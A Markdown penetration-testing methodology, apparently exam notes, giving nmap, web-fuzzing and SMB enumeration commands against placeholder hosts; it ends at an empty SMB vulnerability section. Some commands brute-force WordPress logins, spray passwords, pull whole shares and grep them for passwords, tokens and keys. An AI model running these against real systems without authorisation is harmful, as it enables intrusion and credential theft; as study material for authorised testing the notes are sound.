# Reconnaissance & Enumeration

## 🎯 Goal
Build a complete, repeatable picture of each target: live hosts, open ports, services, versions, web surfaces, file shares, domains, and protocols. Work through this file top-to-bottom for every subnet and every host.

## Table of Contents

1. [Host Discovery](#1-host-discovery-per-subnet)
2. [Port Scanning](#2-port-scanning)
3. [Service Enumeration](#3-service-enumeration-per-open-port)
4. [Web Application Reconnaissance](#4-web-application-reconnaissance)
5. [SMB/NetBIOS Enumeration](#5-smbnetbios-enumeration)
6. [NFS Enumeration](#6-nfs-enumeration)
7. [LDAP/Directory Services Discovery](#7-ldapdirectory-services-discovery)
8. [SNMP Enumeration](#8-snmp-enumeration)
9. [DNS Enumeration](#9-dns-enumeration)
10. [FTP Enumeration](#10-ftp-enumeration)
11. [SSH Enumeration](#11-ssh-enumeration)
12. [SMTP Enumeration](#12-smtp-enumeration)
13. [POP3/IMAP Enumeration](#13-pop3imap-enumeration)
14. [RPC Enumeration](#14-rpc-enumeration)
15. [Database Enumeration](#15-database-enumeration)
16. [RDP/VNC Enumeration](#16-rdpvnc-enumeration)
17. [Active Directory Enumeration](#17-active-directory-enumeration)

---

## 📋 Phase Checklist

### Host Discovery

- [ ] **Host discovery (ICMP/ARP/TCP)** → [1.1](#11-icmp-sweeparp-discoverytcp-ping)
- [ ] **Confirm VM reachability** → [1.2](#12-reachability-confirmation)
- [ ] **Analyze network patterns** → [1.3](#13-network-pattern-analysis)

### Port Scanning

- [ ] **Full TCP scan (scripts/versions)** → [2.1](#21-full-tcp-scan-mandatory-per-host)
- [ ] **Essential UDP scan** → [2.2](#22-udp-scan-essential)
- [ ] **Save results per host** → [2.3](#23-saving-results)
- [ ] **Vuln scan + triage** → [2.4](#24-vulnerability-scanning)

### Service Enumeration

- [ ] **Grab service banners** → [3.1](#31-manual-banner-grabbing)
- [ ] **Confirm service versions** → [3.2](#32-version-confirmation)
- [ ] **Check for weak/default configs** → [3.3](#33-baseline-checks-by-service)

### Web Reconnaissance

- [ ] **Fingerprint web stack** → [4.1](#41-initial-fingerprinting)
- [ ] **Find dirs/endpoints (multi-tool)** → [4.2](#42-directory-endpoint-discovery)
- [ ] **Check special files/backups** → [4.3](#43-special-files-and-backups)
- [ ] **Map web attack surface** → [4.4](#44-attack-surface-mapping)
- [ ] **Identify CMS + targeted scan** → [4.5](#45-cms-scanning)
- [ ] **Web vuln scan + validate** → [4.6](#46-web-vulnerability-scanning)

### SMB/NetBIOS Enumeration

- [ ] **List shares (anon/auth)** → [5.1](#51-share-listing)
- [ ] **Review perms + content sweep** → [5.2](#52-permissions-and-content-sweep)
- [ ] **Collect OS/users/groups/domain** → [5.3](#53-usersgroupsos)
- [ ] **Run NetExec/CME checks** → [5.4](#54-netexeccrackmapexec-enumeration)
- [ ] **Check SMB weaknesses/issues** → [5.5](#55-smb-vulnerability-checks)

### NFS

- [ ] **Find RPC/NFS + exports** → [6.1](#61-detect-rpcnfs-and-list-exports)
- [ ] **Verify mountable exports** → [6.2](#62-mount-shares-and-verify-access)
- [ ] **Mount + hunt sensitive data** → [6.3](#63-search-for-sensitive-data)
- [ ] **Review export options (no_root_squash)** → [6.4](#64-no_root_squash-export-misconfig-checks)

### LDAP/Directory Services Discovery

- [ ] **Query RootDSE + contexts** → [7.1](#71-rootdse-and-naming-contexts)
- [ ] **Enumerate directory objects** → [7.2](#72-users-groups-computers)
- [ ] **Confirm DCs and roles** → [7.3](#73-dc-domain-role-confirmation)

### SNMP

- [ ] **Find community strings** → [8.1](#81-community-discovery)
- [ ] **Walk key OIDs** → [8.2](#82-walk-important-oids)

### DNS

- [ ] **Attempt zone transfers (AXFR)** → [9.1](#91-zone-transfers)
- [ ] **Enumerate subdomains + resolve** → [9.2](#92-subdomain-enumeration)
- [ ] **Sweep core records (NS/SOA/MX/TXT)** → [9.3](#93-record-sweep)

### FTP

- [ ] **Test anonymous login** → [10.1](#101-anonymous-login-check)
- [ ] **Capture version + assess vulns** → [10.2](#102-version-and-vulnerability-check)
- [ ] **Enumerate/download accessible files** → [10.3](#103-file-enumeration)

### SSH

- [ ] **Enumerate version + algorithms** → [11.1](#111-version-and-algorithm-enumeration)
- [ ] **Identify auth methods/policy** → [11.2](#112-authentication-methods)
- [ ] **Assess brute-force risk (in-scope)** → [11.3](#113-brute-force-if-applicable)

### SMTP

- [ ] **Test user enum (VRFY/EXPN/RCPT)** → [12.1](#121-user-enumeration)
- [ ] **Check open relay/misconfig** → [12.2](#122-open-relay-check)

### POP3/IMAP

- [ ] **Capture banners/capabilities** → [13.1](#131-banner-and-capabilities)
- [ ] **Assess auth + enum exposure** → [13.2](#132-authentication-and-enumeration)

### RPC

- [ ] **Enumerate RPC services/interfaces** → [14.1](#141-rpc-service-enumeration)
- [ ] **RPC client enumeration** → [14.2](#142-rpc-client-enumeration)

### Databases

- [ ] **Enumerate MSSQL posture** → [15.1](#151-mssql-enumeration)
- [ ] **Enumerate MySQL posture** → [15.2](#152-mysql-enumeration)
- [ ] **Enumerate PostgreSQL posture** → [15.3](#153-postgresql-enumeration)

### RDP/VNC

- [ ] **Enumerate RDP config/capabilities** → [16.1](#161-rdp-enumeration)
- [ ] **Enumerate VNC auth/posture** → [16.2](#162-vnc-enumeration)

### Active Directory

- [ ] **Enumerate domain + trusts** → [17.1](#171-domain-enumeration)
- [ ] **Enumerate users/groups** → [17.2](#172-user-and-group-enumeration)
- [ ] **Assess Kerberos exposure** → [17.3](#173-kerberos-enumeration)
- [ ] **Enumerate shares/files** → [17.4](#174-share-enumeration)
- [ ] **BloodHound analysis** → [17.5](#175-bloodhound--sharphound)
- [ ] **Extract credentials** → [17.6](#176-credential-dumping)

---

## Quick Reference Commands

### Essential One-Liners

```bash
# Fast TCP scan all ports
sudo nmap -Pn -sS -p- --min-rate 10000 <RHOST>

# Service scan on discovered ports
sudo nmap -sC -sV -p <PORTS> <RHOST>

# UDP top ports
sudo nmap -sU --top-ports 20 <RHOST>

# SMB null session
smbclient -L //<RHOST> -N && enum4linux -a <RHOST>

# LDAP anonymous
ldapsearch -x -H ldap://<RHOST> -s base

# Web directory brute
gobuster dir -u http://<RHOST>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# SNMP walk
snmpwalk -v2c -c public <RHOST>

# Zone transfer
dig axfr <DOMAIN> @<NS>

# Rustscan fast all-ports scan, chaining into nmap
rustscan -a <RHOST> --ulimit 5000 -- -sV -sC -oA rustscan_nmap_<RHOST>

# Naabu fast TCP port discovery
naabu -host <RHOST> -p - -rate 20000 -o naabu_<RHOST>.txt

# HTTP probing on many hosts from a file
httpx -l hosts_http.txt -status-code -title -tech-detect -o httpx_hosts_http.txt

# External subdomain discovery quick combo
subfinder -d <DOMAIN> -all -o subdomains_<DOMAIN>.txt
dnsx -l subdomains_<DOMAIN>.txt -a -resp-only -o resolved_subdomains_<DOMAIN>.txt
```

---

## Tools Installation Check

Before starting, verify tools are available:

```bash
# Core scanning
which nmap masscan

# Web enumeration
which gobuster feroxbuster ffuf nikto whatweb wpscan

# SMB tools
which smbclient smbmap enum4linux enum4linux-ng rpcclient

# Network tools
which snmpwalk onesixtyone ldapsearch

# Password attacks
which hydra medusa

# AD tools
which bloodhound-python kerbrute impacket-GetNPUsers impacket-GetUserSPNs

# NetExec/CrackMapExec
which nxc netexec crackmapexec
```

---

## Methodology Flowchart

```
1. HOST DISCOVERY
   └─> Live hosts identified
       │
2. PORT SCANNING
   └─> TCP all ports → UDP top ports
       │
3. SERVICE ENUMERATION
   └─> Banner grab → Version confirm → Baseline checks
       │
4. SERVICE-SPECIFIC DEEP DIVE
   ├─> Web (80/443/8080) → Tech stack → Dirs → Vulns
   ├─> SMB (139/445) → Shares → Users → Vulns
   ├─> LDAP (389/636) → Domain info → Users/Groups
   ├─> DNS (53) → Zone transfer → Subdomains
   ├─> SNMP (161) → Community → Walk OIDs
   ├─> NFS (2049) → Exports → Mount → Search
   ├─> Databases → Connect → Enumerate
   └─> Other services → Protocol-specific enum
       │
5. DOCUMENTATION
   └─> Host notes → Attack hypotheses → Next steps
```

---

## Environment Setup

```bash
# Create working directory structure
mkdir -p ~/exam/{enum,findings,vulns}
cd ~/exam

# Add to /etc/hosts if needed
echo "<RHOST> <HOSTNAME>" | sudo tee -a /etc/hosts
```

---

## Common Wordlists Reference

```bash
# Directories / files
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-files.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt

# URL parameters
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt

# DNS/Subdomains
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt

# Usernames
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Passwords
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt

# SNMP
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
/usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
```
--- 

## 1. Host Discovery (per subnet)

### 1.1 ICMP sweep/ARP discovery/TCP ping

Start with ICMP, then fall back to TCP pings, then ARP if local, then no-ping scans if everything is filtered.

```bash
# ICMP sweep (fast initial discovery)
nmap -sn <SUBNET>/24 -oA recon_hosts_icmp

# Extract live IPs (grep on gnmap)
grep "Status: Up" recon_hosts_icmp.gnmap | cut -d " " -f 2 > live_hosts.txt

# Alternative: ping sweep with fping
fping -a -g <SUBNET>/24 2>/dev/null > live_hosts.txt
```

If ICMP is blocked:

```bash
# TCP SYN ping on common ports across the subnet
nmap -sn -PS21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3389,5900,8080 \
  <SUBNET>/24 -oA recon_hosts_tcp

# TCP ACK ping on common ports (useful for stateful firewalls)
nmap -sn -PA21,22,80,443 <SUBNET>/24 -oA recon_hosts_tcp_ack
```

If you are on the same L2 (local network), add ARP discovery:

```bash
# ARP discovery with Nmap (fastest for local networks)
nmap -sn -PR <SUBNET>/24 -oA recon_hosts_arp

# ARP discovery of local network with arp-scan
sudo arp-scan -l

# ARP discovery of specific subnet with arp-scan
sudo arp-scan <SUBNET>/24
```

If discovery is totally blocked:

```bash
# Assume single host is up and scan without ping
nmap -Pn <IP> -oA recon_host_10.11.1.5_noping

# Scan entire subnet as up hosts with top 1000 ports
nmap -Pn -sS --top-ports 1000 <SUBNET>/24 -oA recon_noping_top1000
```

NetBIOS discovery (when SMB/NetBIOS suspected):

```bash
# NetBIOS scan of subnet with nbtscan
nbtscan <SUBNET>/24

# Recursive NetBIOS scan of subnet with nbtscan
nbtscan -r <SUBNET>/24

# Lookup NetBIOS names for a single host
nmblookup -A <RHOST>

# SMB discovery across subnet with NetExec (nxc)
nxc smb <SUBNET>/24

# SMB discovery across subnet with netexec
netexec smb <SUBNET>/24
```

### 1.2 Reachability confirmation

For every "up" host, validate from your VM:

```bash
# Ping host to confirm basic reachability
ping -c 2 <RHOST>

# Run traceroute to identify network path to host
traceroute -n <RHOST>

# Check if host responds on common TCP ports
nc -zv <RHOST> 22 80 443 445 2>&1
```

When ping fails but scan suggests presence, keep host anyway.

### 1.3 Network pattern analysis

From live hosts list, roughly cluster likely roles:

```bash
# Quick top-ports/service scan across live hosts to guess roles
nmap -sS -sV -T4 --top-ports 200 -iL live_hosts.txt -oA nmap_top200_all

# OS fingerprinting against live hosts to guess operating systems
nmap -O --osscan-guess -iL live_hosts.txt -oA nmap_os_guess_all

# Aggressive scan on top ports for detailed host information
nmap -A -T4 --top-ports 100 -iL live_hosts.txt -oA nmap_aggressive_top100
```

Note patterns like:

- Low addresses often servers
- Many identical services → workstation pool
- Single DC-like host (53/88/389/445/464/636...) → directory core
- Port 80/443/8080 → web servers
- Port 1433/3306/5432 → database servers

---

## 2. Port Scanning

### Port-Based Enumeration Cheatsheet

|Port|Service|First Commands|
|---|---|---|
|`21`|FTP|`ftp <RHOST>` / `nmap --script ftp-anon`|
|`22`|SSH|`ssh -v <RHOST>` / `nmap --script ssh2-enum-algos`|
|`23`|Telnet|`telnet <RHOST>`|
|`25`|SMTP|`nc -nv <RHOST> 25` / `smtp-user-enum`|
|`53`|DNS|`dig axfr @<RHOST> <DOMAIN>`|
|`80`/`443`|HTTP(S)|`whatweb` / `gobuster` / `nikto`|
|`88`|Kerberos|`kerbrute` / `GetNPUsers`|
|`110`|POP3|`nc -nv <RHOST> 110`|
|`111`|RPC|`rpcinfo -p <RHOST>`|
|`135`|MSRPC|`rpcclient -U "" -N <RHOST>`|
|`139`/`445`|SMB|`smbclient -L` / `enum4linux` / `nxc smb`|
|`143`|IMAP|`nc -nv <RHOST> 143`|
|`161`|SNMP|`snmpwalk -v2c -c public <RHOST>`|
|`389`/`636`|LDAP|`ldapsearch -x -H ldap://<RHOST>`|
|`1433`|MSSQL|`impacket-mssqlclient` / `nxc mssql`|
|`1521`|Oracle|`odat` / `tnscmd10g`|
|`2049`|NFS|`showmount -e <RHOST>`|
|`3306`|MySQL|`mysql -h <RHOST> -u root`|
|`3389`|RDP|`xfreerdp /v:<RHOST>` / `nxc rdp`|
|`5432`|PostgreSQL|`psql -h <RHOST> -U postgres`|
|`5900`|VNC|`vncviewer <RHOST>`|
|`5985`/`5986`|WinRM|`evil-winrm -i <RHOST> -u <USER> -p <PASS>`|
|`6379`|Redis|`redis-cli -h <RHOST>`|
|`27017`|MongoDB|`mongo <RHOST>`|

### 2.1 Full TCP scan (mandatory per host)

**Fast discovery scan first:**

```bash
# Ultra-fast TCP all-ports sweep with Nmap
sudo nmap -Pn -sS -p- --min-rate 10000 -v <RHOST> -oA nmap_fast_tcp_<RHOST>

# Fast TCP all-ports sweep with Masscan
sudo masscan -p1-65535 <RHOST> --rate=1000 -oL masscan_<RHOST>.txt
```

**Detailed scan on discovered ports:**

```bash
# Extract open TCP ports from fast Nmap scan into a comma-separated list
grep -E '^[0-9]+/tcp.*open' nmap_fast_tcp_<RHOST>.nmap | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//' > tcp_ports.txt

# Run detailed Nmap scan with default scripts and version detection on discovered ports
sudo nmap -sC -sV -p $(cat tcp_ports.txt) <RHOST> -oA nmap_detailed_tcp_<RHOST>

# Run full comprehensive TCP scan with aggressive detection on all ports
sudo nmap -A -T4 -sC -sV -p- <RHOST> -oA nmap_full_tcp_<RHOST>
```

**Alternative comprehensive approaches:**

```bash
# Standard thorough TCP scan with default scripts and version detection
sudo nmap -Pn -sC -sV -p- -oN alltcp.txt <RHOST>

# Service scan with maximum version detection intensity
sudo nmap -sV --version-intensity 9 -p- <RHOST> -oA nmap_versions_<RHOST>

# Aggressive TCP scan using only discovery scripts
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery <RHOST>
```

### 2.2 UDP scan (essential)

UDP scanning is slow but critical for finding services like SNMP, DNS, TFTP:

```bash
# UDP scan of top 100 ports (recommended minimum)
sudo nmap -sU --top-ports 100 <RHOST> -oA nmap_udp_top100_<RHOST>

# UDP scan of top 20 ports with scripts and service detection
sudo nmap -Pn -sU -sV -sC --top-ports=20 -oN top_20_udp_nmap.txt <RHOST>

# UDP scan of critical high-value ports
sudo nmap -sU -p 53,67,68,69,123,161,162,500,514,520,623,624,631,1900,4500,5353 <RHOST> -oA nmap_udp_critical_<RHOST>

# Targeted UDP scan with service detection on key ports
sudo nmap -sU -sV -p 53,69,123,161,500 <RHOST> -oA nmap_udp_services_<RHOST>
```

### 2.3 Saving results

Create organized folder structure:

```bash
# Create organized recon directory structure for the host
mkdir -p recon/<RHOST>/{nmap,web,smb,notes}

# Move all scan files for this host into the Nmap directory
mv *<RHOST>* recon/<RHOST>/nmap/

# Copy host and port lists into the host recon directory
cp live_hosts.txt tcp_ports.txt recon/<RHOST>/
```

### 2.4 Vulnerability scanning

```bash
# Run Nmap vulnerability scripts against all discovered services
sudo nmap -A -T4 -sC -sV --script vuln <RHOST> -oA nmap_vuln_tcp_<RHOST>

# Check SMB services for known vulnerabilities
sudo nmap --script smb-vuln* -p 139,445 <RHOST>

# Check HTTPS service for Heartbleed and related SSL issues
sudo nmap --script ssl-heartbleed -p 443 <RHOST>

# Update Nuclei templates
nuclei -ut

# Run Nuclei scanner against HTTP target
nuclei -target http://<RHOST> -o nuclei_<RHOST>.txt
```

---

## 3. Service Enumeration (per open port)

### 3.1 Manual banner grabbing

For each open port, grab manual banners even if Nmap detected them:

```bash
# Raw TCP banner grab
nc -nv <RHOST> <PORT>

# HTTP banner 
echo -e "HEAD / HTTP/1.0\r\n\r\n" | nc -nv <RHOST> 80
curl -I http://<RHOST>/
curl -s http://<RHOST>/ | head -50
curl -k -I https://<RHOST>/

# Telnet for interactive services
telnet <RHOST> <PORT>

# Verbose curl for headers (HTTP)
curl -v http://<RHOST>/

# Verbose curl for headers (HTTPS)
curl -v -k https://<RHOST>/
```

### 3.2 Version confirmation

```bash
# High-intensity version detection
sudo nmap -sV --version-intensity 9 -p $(cat tcp_ports.txt) <RHOST> -oA nmap_versions_<RHOST>

# Specific service scripts
nmap -sV --script=banner -p <PORT> <RHOST>
```

### 3.3 Baseline checks by service

**SSH (22)**

```bash
# SSH connection with null authentication attempt
ssh -o PreferredAuthentications=none -o ConnectTimeout=5 <RHOST>

# Verbose SSH to enumerate supported authentication mechanisms
ssh -v <RHOST> 2>&1 | grep "Authentications that can continue"

# Nmap SSH enumeration: algorithms, host keys, authentication methods
nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods <RHOST>
```

**FTP (21):**

```bash
# Connect to FTP (try anonymous login)
ftp <RHOST> # Try: anonymous / anonymous

# Nmap FTP enumeration
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst <RHOST>
```

**SMTP (25):**

```bash
# Banner grab and testing with Netcat
nc -nv <RHOST> 25 # Tru: HELO test, VRFY root, EXPN admin

# Telnet for interactive SMTP commands
telnet <RHOST> 25
```

**RPC/NFS hints:**

```bash
# Enumerate RPC services
rpcinfo -p <RHOST>

# Nmap RPC enumeration
nmap -p 111 --script rpcinfo <RHOST>
```

### 3.4 TLS/SSL enumeration

Focus on protocol support, cipher strength, certificate issues, and obvious SSL/TLS vulnerabilities.

```bash
# Nmap cipher suites + certificate info
nmap -p 443,8443,9443 --script ssl-enum-ciphers,ssl-cert <RHOST>

# Check for common SSL/TLS vulns
nmap -p 443 --script ssl-heartbleed,ssl-poodle,ssl-dh-params <RHOST>

# testssl.sh quick profile (very verbose but excellent overview)
testssl.sh --fast --sneaky https://<RHOST>/

# Focus on protocols and known vulns only
testssl.sh --fast --sneaky --protocols --vulnerable https://<RHOST>/

# sslscan summary
sslscan --no-failed --show-certificate <RHOST>:443

# sslyze (if installed)
sslyze --regular <RHOST>:443
```


## 4. Web Application Reconnaissance

Treat every HTTP(S) port as separate (80, 443, 8080, 8443, etc.).

### 4.1 Initial fingerprinting

```bash
# Whatweb fingerprinting
whatweb -a 3 http://<RHOST>:<PORT>/
whatweb -a 4 http://<RHOST>:<PORT>/
whatweb -a 3 https://<RHOST>:<PORT>/

# Headers and redirects
curl -I http://<RHOST>:<PORT>/
curl -k -I https://<RHOST>:<PORT>/
curl -v http://<RHOST>:<PORT>/ 2>&1 | head -50

# Nmap HTTP scripts
nmap -p <PORT> --script http-headers,http-methods,http-title <RHOST>
nmap -p80 --script=http-enum <RHOST>
```



### 4.2 Directory / endpoint discovery

Run at least two tools to reduce blind spots.

**Gobuster:**

```bash
# Directory enumeration
gobuster dir -u http://<RHOST>:<PORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,js,txt,bak,old,zip,sql \
  -t 50 -o web_gobuster_dirs_<RHOST>_<PORT>.txt

# With common wordlist
gobuster dir -u http://<RHOST>:<PORT>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt -t 50 -o web_gobuster_common.txt

# Ignore SSL errors
gobuster dir -u https://<RHOST>:<PORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -k -t 50

# DNS subdomain enumeration
gobuster dns -d <DOMAIN> \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 50 -o dns_gobuster_<DOMAIN>.txt
```

**Feroxbuster:**

```bash
# Recursive directory enumeration
feroxbuster -u http://<RHOST>:<PORT>/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,js,txt \
  -C 404,403 -t 50 -o web_ferox_<RHOST>_<PORT>.txt

# Recursive directory enumeration with depth limit
feroxbuster -u http://<RHOST>:<PORT>/ \
  -w /usr/share/wordlists/dirb/common.txt \
  --depth 3 -x php,txt,html
```

**FFUF (fast, flexible):**

```bash
# Basic directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt \
  -u http://<RHOST>:<PORT>/FUZZ \
  -mc 200,204,301,302,307,401 -o ffuf_dirs_<RHOST>_<PORT>.txt

# Basic directory fuzzing with extensions
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -u http://<RHOST>:<PORT>/FUZZ \
  -e .php,.html,.txt,.bak,.zip,.log

# Recursive scanning
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt \
  -u http://<RHOST>:<PORT>/FUZZ -recursion

# VHost fuzzing
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://<RHOST>:<PORT>/ -H "Host: FUZZ.<DOMAIN>" -fs <BASE_SIZE>

# Parameter fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u http://<RHOST>/page?FUZZ=test -mc 200
```

**Dirsearch:**

```bash
# Basic directory fuzzing with custom wordlist and extensions
dirsearch -u http://<RHOST>:<PORT>/ -x 403,404 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -R 2 -e php,html,txt

# Basic directory fuzzing with extensions and authentication
dirsearch -u http://<RHOST>:<PORT>/ -x 403,400,404,401 \
  -r -R 2 --auth=<USER>:<PASS> --auth-type=basic
```

**Dirb:**

```bash
# Basic directory fuzzing
dirb http://<RHOST>:<PORT>/ /usr/share/wordlists/dirb/common.txt

# Directory fuzzing with huge wordlist
dirb http://<RHOST>:<PORT>/ /usr/share/dirb/wordlists/big.txt -o dirb_output.txt
```

### 4.3 Special files and backups

```bash
# Check common special files
for file in robots.txt sitemap.xml crossdomain.xml .well-known/security.txt; do
  echo "=== $file ===" && curl -s "http://<RHOST>:<PORT>/$file" | head -50
done

# Check for backup files
for ext in bak old tmp backup zip tar.gz sql; do
  curl -s -o /dev/null -w "%{http_code}" "http://<RHOST>:<PORT>/index.$ext"
done

# Git exposure check
curl -s http://<RHOST>:<PORT>/.git/HEAD
curl -s http://<RHOST>:<PORT>/.git/config

# SVN exposure
curl -s http://<RHOST>:<PORT>/.svn/entries

# DS_Store (Mac)
curl -s http://<RHOST>:<PORT>/.DS_Store

# Common config files
for f in config.php config.inc.php wp-config.php web.config .htaccess .env; do
  curl -s -o /dev/null -w "$f: %{http_code}\n" "http://<RHOST>:<PORT>/$f"
done
```

### 4.4 Attack surface mapping

Document in host notes:

- All auth endpoints (`/login`, `/admin`, `/manager`, `/wp-admin`, `/api/auth`)
- Upload points (`/upload`, `/filemanager`, `/elfinder`)
- Parameterized paths (`?id=`, `?page=`, `/item/123`)
- API roots (`/api`, `/rest`, `/graphql`, `/v1`, `/v2`)
- Distinct apps per vhost or port

### 4.5 CMS scanning

**WordPress:**

```bash
# Basic enumeration
wpscan --url http://<RHOST>/ --enumerate u,t,p

# Aggressive plugin detection
wpscan --url http://<RHOST>/ --plugins-detection aggressive

# Full enumeration with API token
wpscan --url http://<RHOST>/ --enumerate vp,vt,tt,cb,dbe,u,m \
  --plugins-detection aggressive --plugins-version-detection aggressive

# Brute force login
wpscan --url http://<RHOST>/ -U <USERNAME> -P /usr/share/wordlists/rockyou.txt

# Ignore SSL errors
wpscan --url https://<RHOST>/ --disable-tls-checks --enumerate u,t,p
```

**Joomla:**

```bash
# Basic Joomla scan against the target
joomscan -u http://<RHOST>/

# Joomla scan with component enumeration
joomscan --ec -u http://<RHOST>/
```

**Drupal:**

```bash
# Droopescan
droopescan scan drupal -u http://<RHOST>/
```

**General CMS:**

```bash
# CMSmap tries to identify the CMS (WordPress, Joomla, Drupal, etc.)
cmsmap -F -d http://<RHOST>/
```

### 4.6 Web vulnerability scanning

**Nikto:**

```bash
# Nikto scan against the specified HTTP service
nikto -h http://<RHOST>:<PORT>/

# Nikto with max scan time and text output
nikto -h http://<RHOST>:<PORT>/ -maxtime 30m -o nikto_<RHOST>.txt

# Nikto with tuning and HTML report
nikto -h http://<RHOST>:<PORT>/ -Tuning 123bde -o report.html -Format htm

# Through proxy
nikto -useproxy http://<PROXY_IP>:3128 -h http://<RHOST>/
```

---

## 5. SMB/NetBIOS Enumeration

### 5.1 Share listing

**Anonymous enumeration:**

```bash
# List SMB shares on the target using a null session
smbclient -L //<RHOST> -N

# List SMB shares on the target explicitly using an empty username and null session
smbclient -L //<RHOST>/ -U '' -N

# Enumerate shares/permissions on the target host
smbmap -H <RHOST>

# Enumerate shares/permissions using the username "anonymous"
smbmap -H <RHOST> -u anonymous

# Enumerate shares/permissions using empty username and empty password
smbmap -H <RHOST> -u '' -p ''

# Recursively list accessible directories/files across shares (can be noisy)
smbmap -H <RHOST> -R

# Attempt to connect to the IPC$ share with a null session
smbclient //<RHOST>/IPC$ -N

# Attempt to connect to the ADMIN$ share with a null session
smbclient //<RHOST>/ADMIN$ -N

# Attempt to connect to the C$ administrative share with a null session
smbclient //<RHOST>/C$ -N
```

**Authenticated enumeration:**

```bash
# Authenticated smbmap enumeration (user/pass)
smbmap -H <RHOST> -u '<USER>' -p '<PASS>'

# Authenticated smbmap enumeration with an explicit domain
smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -d <DOMAIN>

# Connect to a specific SMB share using user%pass syntax
smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'

# Recursive smbmap listing, limited to 5 levels deep
smbmap -H <RHOST> -u '<USER>' -p '<PASS>' -R --depth 5
```

**Null session attempt:**

```bash
# Null session connect to RPC endpoint (no user, no password)
rpcclient -U "" -N <RHOST>

# Enumerate domain users via RPC using null session
rpcclient -U "" <RHOST> -N -c "enumdomusers"

# Enumerate domain groups via RPC using null session
rpcclient -U "" <RHOST> -N -c "enumdomgroups"
```

### 5.2 Permissions and content sweep

**In smbclient prompt:**

```bash
# Connect to the share (drops into smb: \> prompt)
smbclient //<RHOST>/<SHARE> -U '<USER>%<PASS>'

# Enable recursive directory traversal for subsequent commands
smb: \> recurse ON

# Disable interactive prompts (useful for batch gets)
smb: \> prompt OFF

# List current directory contents (recursing if enabled)
smb: \> ls

# Download everything in the current directory (and subdirs if recurse ON)
smb: \> mget *
```

**On Kali after download:**

```bash
# Identify file types 
file *

# Quick string sweep for readable artifacts (min length 8)
strings -n 8 *

# Grep for common secret keywords (case-insensitive, recursive, with line numbers)
grep -RniE "pass|pwd|secret|token|key|cred" .

# Find common config/text files, then search for lines/files mentioning "password"
find . -name "*.txt" -o -name "*.xml" -o -name "*.ini" -o -name "*.conf" | xargs grep -l password
```

**Mount SMB share:**

```bash
# Create a local mountpoint for the SMB share
mkdir /tmp/share

# Mount SMB share interactively (may prompt for creds depending on target)
sudo mount -t cifs //<RHOST>/<SHARE> /tmp/share

# Mount SMB share with explicit credentials (non-interactive)
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<RHOST>/<SHARE> /tmp/share
```

### 5.3 Users/groups/OS

**Enum4linux:**

```bash
# Full enum4linux sweep; save output to a file
enum4linux -a <RHOST> | tee enum4linux_<RHOST>.txt

# Enumerate users
enum4linux -U <RHOST> 

# Enumerate groups
enum4linux -G <RHOST>

# Enumerate shares
enum4linux -S <RHOST>  
```

**Enum4linux-ng (updated):**

```bash
# enum4linux-ng comprehensive scan; output in multiple formats with prefix
enum4linux-ng -A <RHOST> -oA enum4linux_ng_<RHOST>
```

**Nmap SMB NSE scripts:**

```bash
# Nmap SMB scripts
nmap -p 139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-security-mode <RHOST> -oA nmap_smb_<RHOST>

# Nmap comprehensive SMB enumeration
nmap -p 445 --script "smb-enum-*" <RHOST>

# Nmap SMB Version detection
nmap -p 139,445 --script smb-protocols <RHOST>
```

Here's the reformatted content with 2 NetExec examples and the rest using CrackMapExec:

### 5.4 NetExec/CrackMapExec enumeration

```bash
# Run NetExec (nxc alias) SMB module against the target (basic info + default checks)
nxc smb <RHOST>

# Run NetExec SMB module with null session
nxc smb <RHOST> -u '' -p ''

# Run CrackMapExec SMB module against the target
crackmapexec smb <RHOST>

# Authenticate to SMB and enumerate active SMB sessions on the target
crackmapexec smb <RHOST> -u '' -p '' --sessions

# Authenticate to SMB and enumerate users currently logged on to the target
crackmapexec smb <RHOST> -u '' -p '' --loggedon-users

# Spider shares for files
crackmapexec smb <RHOST> -u '' -p '' -M spider_plus

# Password spray
crackmapexec smb <RHOST> -u users.txt -p '' --continue-on-success
```

### 5.5 SMB vulnerability checks

```bash
